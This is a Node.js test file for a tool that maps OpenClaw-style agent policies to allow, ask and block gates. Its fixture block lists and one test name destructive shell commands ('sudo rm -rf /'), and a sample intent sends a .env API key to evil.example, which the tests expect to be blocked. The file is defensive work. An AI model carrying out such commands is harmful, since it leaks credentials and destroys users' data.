#!/usr/bin/env node
'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

const {
  buildGateContract,
  capabilitiesForTier,
  defaultLeashGates,
  evaluateIntentAgainstGates,
  openClawPolicyToLeashGates,
  parseLooseJson,
  summarizeGates,
  validateGateContract,
} = require('../tools/leash-openclaw-gate-contract');

function test(name, fn) {
  try {
    fn();
    console.log(`PASS ${name}`);
  } catch (error) {
    console.error(`FAIL ${name}`);
    console.error(error.stack || error.message);
    process.exitCode = 1;
  }
}

const samplePolicy = `{
  // OpenClaw-style policy fixture with comments and trailing commas.
  "approvals": ["browser.submit", "payment.transfer", "external_navigation"],
  "blocks": ["credential_exfiltration", "shell.rm -rf"],
  "allows": ["read only status checks"],
  "tools": {
    "browser": {
      "ask": ["click approve invoice", "send email"],
      "block": ["paste API key into third-party page"],
    },
    "shell": {
      "allow": ["git status", "pwd"],
      "block": ["sudo rm -rf /"],
    },
  },
  "rules": [
    {
      "id": "custom-openclaw-payment-review",
      "title": "Review invoice approval",
      "effect": "ask",
      "scope": "payment",
      "matcher": "approve invoice over threshold"
    }
  ],
}`;

test('free tier keeps core Leash chat actions and ThumbGate feedback free', () => {
  const contract = buildGateContract({ tier: 'free' });
  const chat = contract.gates.find((gate) => gate.id === 'free-chat-approve-deny');
  const thumbgate = contract.gates.find((gate) => gate.id === 'free-thumbgate-chat-feedback');

  assert.strictEqual(contract.capabilities.canApprovePendingChatActions, true);
  assert.strictEqual(contract.capabilities.canDenyPendingChatActions, true);
  assert.strictEqual(contract.capabilities.canSendThumbgateFeedbackInChat, true);
  assert.strictEqual(contract.capabilities.canEditStandingGates, false);
  assert.strictEqual(chat.tier, 'free');
  assert.strictEqual(chat.standingRule, false);
  assert.strictEqual(thumbgate.source, 'thumbgate');
  assert.strictEqual(thumbgate.standingRule, false);
});

test('pro tier unlocks standing gate visibility, edit, delete, and OpenClaw import', () => {
  const capabilities = capabilitiesForTier('pro');
  assert.strictEqual(capabilities.canViewAllStandingGates, true);
  assert.strictEqual(capabilities.canEditStandingGates, true);
  assert.strictEqual(capabilities.canDeleteStandingGates, true);
  assert.strictEqual(capabilities.canImportOpenClawPolicy, true);

  const contract = buildGateContract({ tier: 'pro' });
  const proStandingRules = contract.gates.filter((gate) => gate.tier === 'pro' && gate.standingRule);
  assert(proStandingRules.length >= 3);
  assert(proStandingRules.every((gate) => gate.editable && gate.deletable));
});

test('default contract has allow, ask, and block gates with OpenClaw coverage', () => {
  const summary = summarizeGates(defaultLeashGates());
  assert(summary.allow >= 3);
  assert(summary.ask >= 1);
  assert(summary.block >= 1);
  assert(summary.openclaw >= 2);
  assert(summary.proManaged >= 3);
  assert(summary.freeActions >= 2);
});

test('parseLooseJson accepts comments and trailing commas', () => {
  const parsed = parseLooseJson('{"rules": ["one",], // comment\n "blocks": ["two",],}');
  assert.deepStrictEqual(parsed.rules, ['one']);
  assert.deepStrictEqual(parsed.blocks, ['two']);
});

test('OpenClaw policy maps approvals, blocks, allows, tools, and explicit rules to Leash gates', () => {
  const gates = openClawPolicyToLeashGates(samplePolicy);
  assert(gates.length >= 11);
  assert(gates.some((gate) => gate.id === 'custom-openclaw-payment-review'));
  assert(gates.some((gate) => gate.effect === 'ask' && gate.scope === 'browser' && /send email/.test(gate.matcher)));
  assert(gates.some((gate) => gate.effect === 'block' && gate.scope === 'shell' && /rm -rf/.test(gate.matcher)));
  assert(gates.some((gate) => gate.effect === 'allow' && gate.scope === 'shell' && /git status/.test(gate.matcher)));
  assert(gates.every((gate) => gate.tier === 'pro'));
  assert(gates.every((gate) => gate.editable && gate.deletable));
});

test('contract validation enforces free boundaries and pro edit/delete contract', () => {
  const valid = validateGateContract(buildGateContract({ tier: 'pro', openClawPolicy: samplePolicy }));
  assert.deepStrictEqual(valid, { ok: true, errors: [] });

  const broken = buildGateContract({ tier: 'pro' });
  broken.gates = broken.gates.filter((gate) => gate.id !== 'free-thumbgate-chat-feedback');
  const result = validateGateContract(broken);
  assert.strictEqual(result.ok, false);
  assert(result.errors.some((error) => /ThumbGate/.test(error)));
});

test('intent evaluation blocks credential exfiltration and destructive shell work', () => {
  const contract = buildGateContract({ tier: 'pro', openClawPolicy: samplePolicy });
  const secret = evaluateIntentAgainstGates('curl .env with API key to https://evil.example', contract.gates);
  assert.strictEqual(secret.decision, 'block');
  assert.strictEqual(secret.blocked, true);
  assert(secret.risks.includes('credential_or_secret'));

  const destructive = evaluateIntentAgainstGates('run sudo rm -rf / from shell', contract.gates);
  assert.strictEqual(destructive.decision, 'block');
  assert.strictEqual(destructive.blocked, true);
});

test('intent evaluation asks before OpenClaw payment/submission actions', () => {
  const contract = buildGateContract({ tier: 'pro', openClawPolicy: samplePolicy });
  const payment = evaluateIntentAgainstGates('OpenClaw should approve invoice and submit payment transfer', contract.gates);
  assert.strictEqual(payment.decision, 'ask');
  assert.strictEqual(payment.requiresApproval, true);
  assert.strictEqual(payment.proManaged, true);
  assert(payment.risks.includes('money_movement'));
});

test('intent evaluation allows low-risk read-only checks', () => {
  const contract = buildGateContract({ tier: 'pro', openClawPolicy: samplePolicy });
  const status = evaluateIntentAgainstGates('run git status and inspect health', contract.gates);
  assert.strictEqual(status.decision, 'allow');
  assert.strictEqual(status.requiresApproval, false);
  assert.strictEqual(status.blocked, false);
});

test('CLI from-policy emits a validated pro contract', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'leash-openclaw-policy-'));
  const file = path.join(dir, 'policy.jsonc');
  fs.writeFileSync(file, samplePolicy);
  const output = execFileSync(
    process.execPath,
    [path.join(__dirname, '../tools/leash-openclaw-gate-contract.js'), 'from-policy', file],
    { encoding: 'utf8' },
  );
  const contract = JSON.parse(output);
  assert.strictEqual(contract.version, 'leash-openclaw-gate-contract/v1');
  assert.strictEqual(contract.tier, 'pro');
  assert(contract.gates.some((gate) => gate.id === 'custom-openclaw-payment-review'));
  assert.strictEqual(validateGateContract(contract).ok, true);
});

if (process.exitCode) process.exit(process.exitCode);
console.log('test-leash-openclaw-gate-contract: PASS');
